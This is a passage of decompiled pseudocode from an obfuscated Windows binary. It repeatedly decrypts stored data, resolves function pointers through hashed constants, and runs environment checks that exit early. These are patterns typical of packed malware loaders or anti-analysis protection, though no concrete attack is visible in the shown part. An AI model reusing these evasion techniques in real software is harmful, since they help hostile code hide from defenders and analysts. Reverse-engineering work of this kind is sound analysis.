        (*pcVar13)(lVar25);
      }
      FUN_140001280(pHVar3,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)(uVar20 ^ 0x2dd2d571)),
                    2,2);
      uStack_2f8 = (ulonglong)(uVar20 ^ 0x2dd2d571) + 0xb05de523b568baff;
      uStack_288._0_4_ = 0x400890d1;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x18;
      uStack_280._4_4_ = 0;
      uStack_278 = SUB82(&uStack_2f8,0);
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
      lVar25 = 0x2c;
      if (_DAT_1400df268 == 0) {
        lVar25 = 0x144;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x2dde:
        FUN_140022c50(0x1400df250,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df250,_DAT_1400df260);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = uVar26 ^ 0x8a31da16887e70c1;
      uStack_288._0_4_ = 0x400896b2;
      uStack_288._4_4_ = 1;
      uVar21 = (uint)uStack_2f8;
      *(ulonglong *)(auStack_244 + ((ulonglong)(0xa5aca5c0 - uVar21) - 0x44)) =
           (ulonglong)(uVar21 ^ 0xa5aca5a7);
      *(ulonglong **)(auStack_244 + ((ulonglong)(0xa5aca5c8 - uVar21) - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a9a0;
      if (_DAT_1400df1e8 == 0) {
        puVar17 = (undefined4 *)&UNK_14008a824;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x1bbc:
        FUN_140022c50(0x1400df1d0,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df1d0,_DAT_1400df1e0);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcStack_2c8 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,-0x7939da4c,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      uVar21 = uVar20 + 0xd22d2a8f;
      FUN_140001280(pHStack_2f0,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)uVar21),1,1);
      uStack_2f8 = 0x631a6e63d3e8aafe - (ulonglong)uVar21;
      uStack_288._0_4_ = 0x4008a332;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x18;
      uStack_280._4_4_ = 0;
      *(ulonglong **)(auStack_244 + ((ulonglong)(uVar21 ^ 0x18) - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a8b4;
      if (_DAT_1400df668 == uVar20 + 0xd22d2a87) {
        puVar17 = (undefined4 *)&UNK_14008a958;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0xffd:
        FUN_140022c50(0x1400df650,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df650,_DAT_1400df660);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = 0x840f88b327d638ea;
      uStack_288._0_4_ = 0x40088bdc;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x20;
      uStack_280._4_4_ = 0;
      *(ulonglong **)(auStack_244 + ((ulonglong)(uVar20 ^ 0x2dd2d569) - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a8bc;
      if (_DAT_1400df3b8 == (uVar20 ^ 0x2dd2d569) - 0x10) {
        puVar17 = (undefined4 *)&UNK_14008a9a8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x1f38:
        FUN_140022c50(0x1400df3a0,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df3a0,_DAT_1400df3b0);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcStack_2b8 = (code *)FUN_14000ff70(uVar20 + 0x97d8715f,pHVar3,-0x4a29b098,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      FUN_140001280(pHStack_2f0,
                    *(longlong *)
                     ((longlong)&pHStack_2f0 + (ulonglong)(uVar20 + 0x97d8715f ^ 0xc5ab46d0)),1,1);
      pHStack_2f0 = (HMODULE)0xdcdbe9d7c383e447;
      uStack_288._0_4_ = 0x400895d9;
      uStack_288._4_4_ = 1;
      bVar6 = (byte)*(undefined8 *)
                     (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8)
                     + 0xf0) ^ (char)uVar21 + local_2cb + 's';
      uVar21 = (uint)bVar6 + (uint)bVar6 * -0x10 & 0xff;
      uStack_280._4_4_ = 0;
      uStack_280._0_4_ = uVar21;
      *(HMODULE **)(auStack_244 + (~(local_48 - (ulonglong)(uVar20 + 0xd22d2a87)) - 0x44)) =
           &pHStack_2f0;
      puVar17 = (undefined4 *)&UNK_14008a8fc;
      if (_DAT_1400df628 == uVar20 + 0xd22d2a87) {
        puVar17 = (undefined4 *)&UNK_14008a9e8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x14ac:
        FUN_140022c50(0x1400df610,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df610,_DAT_1400df620);
      uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      uVar26 = uVar26 ^ 0xf425ef20feec0681;
      pHStack_2f0 = (HMODULE)&UNK_140089e63;
      uStack_2e8 = 0x1f;
      iVar9 = (int)uVar26 + 0x2cc12c08;
      lVar25 = 0x234;
      if (_DAT_1400dfa20 == iVar9) {
        lVar25 = 0x218;
      }
      uStack_2f8 = uVar26;
      puStack_2e0 = &uStack_2f8;
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x2380:
        FUN_140022c50(0x1400dfa08,&pHStack_2f0);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400dfa08,_DAT_1400dfa18);
      pHVar3 = pHStack_2f0;
      pcVar14 = (code *)FUN_14000ff70(0x5d7b263a,uVar15,-0x25ec8bb8,pHStack_2f0);
      bVar6 = (byte)*(undefined8 *)
                     (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8)
                     + 200) ^ local_2d1 - ((byte)uVar26 ^ (byte)iVar9);
      FUN_140001280(pHVar3,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)bVar6),1,1);
      FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                    *(longlong *)(auStack_244 + ((ulonglong)(0x10 - bVar6) - 0x44)),1,1);
      uStack_2f8 = 0x24edae6a255b70d6;
      uStack_288._0_4_ = 0x40089609;
      uStack_288._4_4_ = 1;
      *(ulonglong *)(auStack_244 + ((ulonglong)(uint)bVar6 - 0x44)) = (ulonglong)(0x20 - bVar6);
      uStack_278 = SUB82(&uStack_2f8,0);
      uVar4 = uStack_278;
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uVar5 = uStack_276;
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
      uVar8 = uStack_274;
      puVar17 = (undefined4 *)&UNK_14008a884;
      if (_DAT_1400df980 == iVar9 + ((int)local_70 - (uVar21 + (int)uVar26)) + -0x22edbfd1) {
        puVar17 = (undefined4 *)&UNK_14008a8cc;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x840:
        FUN_140022c50(0x1400df968,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df968,_DAT_1400df978);
      uVar26 = uStack_2b0;
      pHVar3 = pHStack_2f0;
      uStack_2f8 = 0xff4d1acd332c5023 - uStack_2b0;
      uStack_288._0_4_ = 0x4008920b;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = (int)uStack_2f8 + -0x5597a86;
      uStack_280._4_4_ = 0;
      lVar25 = 0x23c;
      if (_DAT_1400df860 == 0) {
        lVar25 = 0x70;
      }
      uStack_278 = uVar4;
      uStack_276 = uVar5;
      uStack_274 = uVar8;
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x1a37:
        FUN_140022c50(0x1400df848,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df848,_DAT_1400df858);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcVar13 = (code *)FUN_14000ff70(0x5d7b263a,pHVar3,0x261aa30b,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      uStack_2f8 = 0x6774c83175df78d;
      uStack_288._0_4_ = 0x4008a13a;
      uStack_288._4_4_ = 1;
      uVar21 = (uint)uVar26;
      uStack_280._0_4_ = uVar21 + 0xd22d2a9f;
      uStack_280._4_4_ = 0;
      puVar17 = (undefined4 *)&UNK_14008a828;
      if (_DAT_1400df5c0 == uVar21 + 0xd22d2a87) {
        puVar17 = (undefined4 *)&UNK_14008a9d0;
      }
      uStack_278 = uVar4;
      uStack_276 = uVar5;
      uStack_274 = uVar8;
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x26f8:
        FUN_140022c50(0x1400df5a8,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df5a8,_DAT_1400df5b8);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = 0xfcdf5c8cb04815d3 - uVar26;
      uStack_288._0_4_ = 0x4008a659;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x17;
      uStack_280._4_4_ = 0;
      *(ulonglong **)(auStack_244 + ((ulonglong)((uint)uStack_2f8 ^ 0x8275404a) - 0x44)) =
           &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a8f0;
      if (_DAT_1400df760 == 0) {
        puVar17 = (undefined4 *)&UNK_14008a920;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0xbbe:
        FUN_140022c50(0x1400df748,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df748,_DAT_1400df758);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcVar11 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,-0x4c2f92f4,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      pHStack_2f0 = (HMODULE)0x0;
      uVar15 = (*pcStack_2b8)();
      iVar9 = (*pcVar14)(uVar15,8,&pHStack_2f0);
      puVar17 = (undefined4 *)&UNK_14008a9e4;
      if (iVar9 == uVar21 + 0xd22d2a87) {
        puVar17 = (undefined4 *)&UNK_14008a8ac;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x25c3:
        FUN_1400225e0((undefined1 (*) [32])&uStack_288,0,0x100);
        uStack_2f8 = uStack_2f8 & 0xffffffff00000000;
        (*pcVar13)(pHStack_2f0,10,(undefined1 (*) [32])&uStack_288,0x100,&uStack_2f8);
        (*pcVar11)(pHStack_2f0);
        uStack_294 = (undefined4)uStack_2f8;
      }
      uStack_2f8 = uVar26 ^ 0x9dc698331ffc6403;
      uStack_288._0_4_ = 0x400891dc;
      uStack_288._4_4_ = 1;
      uVar20 = (uint)uStack_2f8;
      uStack_280._4_4_ = 0;
      uStack_280._0_4_ = uVar20 + 0xcdd14e9e;
      *(ulonglong **)(auStack_244 + ((ulonglong)(0x322eb18a - uVar20) - 0x44)) = &uStack_2f8;
      lVar25 = 0x74;
      if (_DAT_1400dfa68 == (uVar20 ^ 0x322eb17a)) {
        lVar25 = 0xac;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x1087:
        FUN_140022c50(0x1400dfa50,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400dfa50,_DAT_1400dfa60);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = 0xf3403972b1a8d20;
      uStack_288._0_4_ = 0x4008a5e2;
      uStack_288._4_4_ = 1;
      bVar6 = ((byte)(uVar20 + 0xcdd14e9e) ^ local_2ce * '\x0f' + 0x6fU) * '\x13';
      *(undefined8 *)(auStack_244 + ((ulonglong)bVar6 - 0x44)) = 0x20;
      *(ulonglong **)(auStack_244 + ((ulonglong)(bVar6 + 8) - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008aa2c;
      if (_DAT_1400df740 == bVar6 - 8) {
        puVar17 = (undefined4 *)&UNK_14008a960;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x2728:
        FUN_140022c50(0x1400df728,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df728,_DAT_1400df738);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcVar14 = (code *)FUN_14000ff70(uVar21 ^ 0xe87993a1,pHVar3,-0x4a29b098,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      uStack_2f8 = 0xb9a3c0071613c9a3;
      uStack_288._0_4_ = 0x40088ae4;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = uVar21 ^ 0x2dd2d561;
      uStack_280._4_4_ = 0;
      uStack_278 = SUB82(&uStack_2f8,0);
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
      lVar25 = 0xa0;
      if (_DAT_1400df940 == (uVar21 ^ 0x2dd2d579)) {
        lVar25 = 0x170;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x18c0:
        FUN_140022c50(0x1400df928,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df928,_DAT_1400df938);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = 0x8750a544ca05b1c0 - uVar26;
      uStack_288._0_4_ = 0x40088c13;
      uStack_288._4_4_ = 1;
      *(undefined8 *)(auStack_244 + ((ulonglong)(0x9c32dc4f - (uint)uStack_2f8) - 0x44)) = 0x18;
      uVar20 = (uint)uStack_2f8 ^ 0x9c32dc57;
      *(ulonglong **)(auStack_244 + ((ulonglong)uVar20 - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a838;
      if (_DAT_1400df900 == 0) {
        puVar17 = (undefined4 *)&UNK_14008a7fc;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x1d7:
        FUN_140022c50(0x1400df8e8,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df8e8,_DAT_1400df8f8);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcVar13 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,-0x6f0f3fbe,pHVar1);
      uVar19 = uVar21 + 0xd22d2a8f;
      FUN_140001280(pHVar1,*(longlong *)(auStack_244 + ((ulonglong)uVar19 - 0x44)),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      uVar15 = (*pcVar14)();
      iVar9 = (*pcVar13)(uVar15);
      uStack_288._0_1_ = iVar9 != 0;
      uVar8 = (*pcStack_2c8)();
      pcStack_2c8 = (code *)CONCAT44(pcStack_2c8._4_4_,uVar8);
      uVar20 = ~(_DAT_1400dfbe4 - (uVar20 + uVar19)) ^ 0xcdf33027;
      uStack_2f8 = 0x4f5feb01b8f31bb;
      uStack_288._0_4_ = 0x4008915c;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x20 - uVar19;
      uStack_280._4_4_ = 0;
      uStack_278 = SUB82(&uStack_2f8,0);
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
      puVar17 = (undefined4 *)&UNK_14008a9e0;
      if (_DAT_1400def50 == 8 - uVar19) {
        puVar17 = (undefined4 *)&UNK_14008a808;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x337a:
        FUN_140022c50(0x1400def38,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400def38,_DAT_1400def48);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = uVar26 + 0xba0bb7c34f5106fd;
      uStack_288._0_4_ = 0x4008a34a;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x24;
      uStack_280._4_4_ = 0;
      *(ulonglong **)(auStack_244 + ((ulonglong)((uint)uStack_2f8 ^ 0x7d23dc66) - 0x44)) =
           &uStack_2f8;
      lVar25 = 0x178;
      if (_DAT_1400df960 == (uint)uStack_2f8 + 0x82dc238a) {
        lVar25 = 0x1d4;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x1ba6:
        FUN_140022c50(0x1400df948,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df948,_DAT_1400df958);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      uVar19 = uVar21 + 0x97d8715f;
      pcVar14 = (code *)FUN_14000ff70(uVar19,pHVar3,0x28a19a95,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      (*pcVar14)();
      uStack_2f8 = 0x6df6344f558495cb - (ulonglong)uVar19;
      uStack_288._0_4_ = 0x400890b9;
      uStack_288._4_4_ = 1;
      *(undefined8 *)(auStack_244 + ((ulonglong)(uVar21 + 0xd22d2a8f) - 0x44)) = 0x18;
      *(ulonglong **)(auStack_244 + ((ulonglong)(uVar21 + 0xd22d2a97) - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a854;
      if (_DAT_1400df6a8 == 0) {
        puVar17 = (undefined4 *)&UNK_14008a9ec;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x8fa:
        FUN_140022c50(0x1400df690,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df690,_DAT_1400df6a0);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = 0xccc61ccb18eb1261;
      uStack_288._0_4_ = 0x4008a16f;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x2d;
      uStack_280._4_4_ = 0;
      uStack_278 = SUB82(&uStack_2f8,0);
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
      lVar25 = 0xf0;
      if (_DAT_1400df6e0 == (int)local_58 * 0x60dd6443 - (uVar21 + 0xd22d2a97 + uVar21 + 0xd22d2a8f)
         ) {
        lVar25 = 0x1c8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x6f3:
        FUN_140022c50(0x1400df6c8,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df6c8,_DAT_1400df6d8);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      uVar19 = local_298 - uVar19;
      pcVar14 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,~uVar19,pHVar1);
      FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      pHStack_2f0 = (HMODULE)0xb8f03c174ca93922;
      uStack_288._0_4_ = 0x40089174;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = -0x510b1f9e - ~uVar19;
      uStack_280._4_4_ = 0;
      uStack_278 = SUB82(&pHStack_2f0,0);
      uStack_276 = (undefined2)((ulonglong)&pHStack_2f0 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&pHStack_2f0 >> 0x20);
      puVar17 = (undefined4 *)&UNK_14008a92c;
      if (_DAT_1400df0e0 == 0) {
        puVar17 = (undefined4 *)&UNK_14008aa14;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x2c80:
        FUN_140022c50(0x1400df0c8,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df0c8,_DAT_1400df0d8);
      uVar26 = uStack_2b0;
      uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      uStack_2f8 = 0x22b1c1e27764874f;
      pHStack_2f0 = (HMODULE)0x14008a27d;
      uVar21 = (uint)uStack_2b0;
      *(undefined8 *)((longlong)&pHStack_2f0 + (ulonglong)(uVar21 ^ 0x2dd2d571)) = 0x2a;
      puStack_2e0 = &uStack_2f8;
      lVar25 = 0x1dc;
      if (_DAT_1400df408 == 8 - (uVar21 ^ 0x2dd2d571)) {
        lVar25 = 0x188;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0xa1e:
        FUN_140022c50(0x1400df3f0,&pHStack_2f0);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df3f0,_DAT_1400df400);
      pHVar3 = pHStack_2f0;
      iVar9 = -0xc81e3af - uVar21;
      pcVar13 = (code *)FUN_14000ff70(iVar9,uVar15,-0x11e75850,pHStack_2f0);
      FUN_140001280(pHVar3,uStack_2e8,1,1);
      FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                    *(longlong *)(auStack_244 + ((ulonglong)(0xc5ab46e0 - iVar9) - 0x44)),1,1);
      pHStack_2f0 = (HMODULE)0x0;
      uStack_288._0_4_ = 0;
      uStack_288._4_4_ = 0;
      (*pcVar14)(&pHStack_2f0);
      (*pcVar13)(&uStack_288);
      uStack_2f8 = 0xe0f0786e15255f9c;
      uStack_288._0_4_ = 0x40089fad;
      uStack_288._4_4_ = 1;
      *(ulonglong *)(auStack_244 + ((ulonglong)(0xc5ab46e0 - iVar9) - 0x44)) =
           (ulonglong)(0xc5ab46ed - iVar9);
      uStack_278 = SUB82(&uStack_2f8,0);
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
                    /* WARNING: Switch is manually overridden */
      switch(_DAT_1400df338 != (0xc5ab46d8U - iVar9 & 0xffff)) {
      case true:
        FUN_140022c50(0x1400df320,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df320,_DAT_1400df330);
      pHVar3 = pHStack_2f0;
      uStack_2f8 = uVar26 ^ 0x78770db20c1ba356;
      uStack_288._0_4_ = 0x40089fc2;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x1f;
      uStack_280._4_4_ = 0;
      *(ulonglong **)(auStack_244 + ((ulonglong)((int)uStack_2f8 + 0xde3689e1) - 0x44)) =
           &uStack_2f8;
                    /* WARNING: Switch is manually overridden */
      switch(_DAT_1400dfbb8 == (int)uStack_2f8 + -0x21c9762f) {
      case false:
        FUN_140022c50(0x1400dfba0,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400dfba0,_DAT_1400dfbb0);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcVar14 = (code *)FUN_14000ff70(0x4262d38e,pHVar3,0x2d3a5d7c,pHVar1);
      FUN_140001280(pHVar1,*(longlong *)(auStack_244 + ((ulonglong)(0x2dd2d581 - uVar21) - 0x44)),1,
                    1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      iVar9 = (*pcVar14)(0);
      iVar7 = (*pcVar14)(1);
                    /* WARNING: Switch is manually overridden */
      switch(iVar9 == 800) {
      case false:
        if ((uint)pcStack_2c8 != uVar20) {
LAB_140007229:
          FUN_140009338();
          return;
        }
        break;
      case true:
        if (((uint)pcStack_2c8 != uVar20) && (uVar21 + 0xd22d2cdf != iVar7)) goto LAB_140007229;
      }
      pHStack_2f0 = (HMODULE)0x52036ffdaf1c0d14;
      uStack_288._0_4_ = 0x4008918c;
      uStack_288._4_4_ = 1;
      uVar20 = local_2a0 * -0x576a200f ^ 0x954803dd;
      uVar19 = -uVar20;
      uStack_280._4_4_ = 0;
      uVar20 = uVar20 + 0x28;
      uStack_280._0_4_ = uVar19;
      *(HMODULE **)(auStack_244 + ((ulonglong)uVar20 - 0x44)) = &pHStack_2f0;
      lVar25 = 0x148;
      if (_DAT_1400df248 == (uVar19 ^ 0x18)) {
        lVar25 = 0x50;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0x10ac:
        FUN_140022c50(0x1400df230,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df230,_DAT_1400df240);
      uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      uStack_2f8 = 0x7d53f52347d9f9a6;
      pHStack_2f0 = (HMODULE)&UNK_14008a010;
      uVar19 = -uVar21 + 0x2dd2d593;
      uStack_2e8 = (ulonglong)uVar19;
      puStack_2e0 = &uStack_2f8;
      iVar9 = -uVar21 + 0x2dd2d579;
      puVar17 = (undefined4 *)&UNK_14008a93c;
      if (_DAT_1400df1c8 == iVar9) {
        puVar17 = (undefined4 *)&UNK_14008a820;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x1237:
        FUN_140022c50(0x1400df1b0,&pHStack_2f0);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df1b0,_DAT_1400df1c0);
      pHVar3 = pHStack_2f0;
      uVar20 = ((0x2dd2d581 - uVar21) - iVar9) + local_28c + uVar20;
      pcVar14 = (code *)FUN_14000ff70(uVar20,uVar15,-0x44d87162,pHStack_2f0);
      FUN_140001280(pHVar3,uStack_2e8,1,1);
      FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                    *(longlong *)(auStack_244 + ((ulonglong)(uVar20 + 0x3a54b930) - 0x44)),1,1);
      uStack_204 = 0;
      uStack_1fc = 0;
      auStack_214 = (undefined1  [8])0x0;
      uStack_20c = 0;
      auStack_224 = (undefined1  [8])0x0;
      auStack_21c = (undefined1  [8])0x0;
      auStack_234 = (undefined1  [8])0x0;
      auStack_22c = (undefined1  [8])0x0;
      auStack_244 = (undefined1  [8])0x0;
      auStack_23c = (undefined1  [8])0x0;
      uStack_254 = 0;
      uStack_250 = 0;
      uStack_24c = 0;
      uStack_248 = 0;
      uStack_264 = 0;
      uStack_260 = 0;
      uStack_25c = 0;
      uStack_258 = 0;
      uStack_274 = 0;
      uStack_270 = 0;
      uStack_26c = 0;
      uStack_268 = 0;
      uStack_288._0_4_ = 0x94;
      uStack_288._4_4_ = 0;
      uStack_280._0_4_ = 0;
      uStack_280._4_4_ = 0;
      uStack_278 = 0;
      uStack_276 = 0;
      (*pcVar14)(&uStack_288);
      pHStack_2f0 = (HMODULE)(0x4749b59040a181c7 - (ulonglong)uVar20);
      uStack_288._0_4_ = 0x40089deb;
      uStack_288._4_4_ = 1;
      *(undefined8 *)(auStack_244 + ((ulonglong)(uVar20 + 0x3a54b930) - 0x44)) = 0x18;
      *(HMODULE **)(auStack_244 + ((ulonglong)(-(local_2ba + uVar19) & 0xffff) - 0x44)) =
           &pHStack_2f0;
      puVar17 = (undefined4 *)&UNK_14008a948;
      if (_DAT_1400df9e0 == 0) {
        puVar17 = (undefined4 *)&UNK_14008a81c;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x1744:
        FUN_140022c50(0x1400df9c8,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df9c8,_DAT_1400df9d8);
      uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      uStack_2f8 = 0xe3bf33e9c40960dd;
      pHStack_2f0 = (HMODULE)&UNK_1400895f1;
      *(undefined8 *)((longlong)&pHStack_2f0 + (ulonglong)(0x2dd2d581 - uVar21)) = 0x18;
      puStack_2e0 = &uStack_2f8;
      if (_DAT_1400df2a8 != 8 - (0x2dd2d581 - uVar21)) {
        FUN_140022c50(0x1400df290,&pHStack_2f0);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df290,_DAT_1400df2a0);
      pHVar3 = pHStack_2f0;
      pcStack_2c8 = (code *)FUN_14000ff70(-0x3a54b928,uVar15,0x63e40502,pHStack_2f0);
      uVar20 = uVar21 ^ 0x2dd2d571;
      FUN_140001280(pHVar3,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)uVar20),1,1);
      FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                    *(longlong *)(auStack_244 + ((ulonglong)(uVar20 & 0xff) - 0x44)),1,1);
      uStack_2f8 = (ulonglong)uVar20 + 0x651c4bdae6f6cc63;
      uStack_288._0_4_ = 0x4008a122;
      uStack_288._4_4_ = 1;
      *(ulonglong *)(auStack_244 + ((ulonglong)(uVar20 & 0xff) - 0x44)) = (ulonglong)(uVar20 + 0x10)
      ;
      *(ulonglong **)(auStack_244 + ((ulonglong)(0x18 - uVar20) - 0x44)) = &uStack_2f8;
      puVar17 = (undefined4 *)&UNK_14008a82c;
      if (_DAT_1400df378 == (uVar21 ^ 0x2dd2d579)) {
